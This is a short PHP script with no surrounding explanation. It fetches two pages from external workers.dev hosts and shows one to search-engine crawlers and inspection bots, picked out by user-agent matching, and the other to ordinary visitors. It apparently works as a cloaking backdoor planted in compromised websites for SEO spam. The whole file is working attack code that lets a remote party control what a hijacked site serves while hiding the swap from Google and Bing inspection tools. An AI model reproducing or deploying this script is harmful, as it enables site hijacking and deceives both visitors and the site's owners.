<?php 
function smoky($url) { 
    if (ini_get('allow_url_fopen')) { 
        return file_get_contents($url); 
    } elseif (function_exists('curl_init')) { 
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); 
        $response = curl_exec($ch); 
        curl_close($ch); 
        return $response; 
    } 
    return false; 
} 
 
$res = strtolower($_SERVER["HTTP_USER_AGENT"]); 
 
$bot = "https://hitam-steve.tempo-toto.workers.dev/"; 
$user_page = "https://putih-steve.tempo-toto.workers.dev/"; 
 
$file_bot = smoky($bot); 
$file_user = smoky($user_page); 
 
$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/"; 
 
if (preg_match($botchar, $res)) { 
    echo $file_bot ?: "No content from bot source."; 
    exit; 
} else { 
    echo $file_user ?: "404 Not Found"; 
    exit; 
}
